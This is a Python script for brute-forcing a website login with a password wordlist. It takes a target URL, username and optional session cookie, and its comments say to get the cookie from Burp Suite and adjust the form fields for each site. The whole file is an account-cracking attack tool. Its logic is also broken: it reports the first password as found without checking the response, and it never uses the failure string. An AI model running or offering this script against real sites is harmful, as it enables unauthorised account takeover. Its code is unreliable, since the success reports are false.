import request
from termcolor import colored

url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For The Account To Bruteforce: ')
passd_file = input('[+] Enter Password File To USe: ')
login_failed_message = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('[+] Enter Cookie Value(Optional): ') #This line is optional because if you are bruteforce the indside page of the website than you need to put the session key.
#This session key you can get it from "Burp Suite".

def cracking(username, url):
    for Password in passwords:
        Password = Password.strip()
        print(colored(('Trying : ' + Password), 'red'))
        data = {'username': username, 'password': Password, 'Login' : 'submit'} #This the line you need to change for every website according to their HTML Code req.
        if cookie_value != '':
            response = request.get(url, params = {'username': username, 'password': Password, 'Login' : 'Login'}, cookies = {'Cookie' : cookie_value})
            #again the above line of code you need to change by seeing the HTMl code of the website you can see the source code by pressing "ctrl + u"
            #and for the cookie part you need to use the Burp Suite to See and chcek the Cookie and their parameter.
        else:
            print(colored(('[+] Found Username ==> ' + username), 'green'))
            print(colored(('[+] Found Password ==> ' + Password), 'green'))
            exit()

with open(passd_file, 'r') as passwords:
    cracking(username, url)

print('[!!] Password Not In The List.....')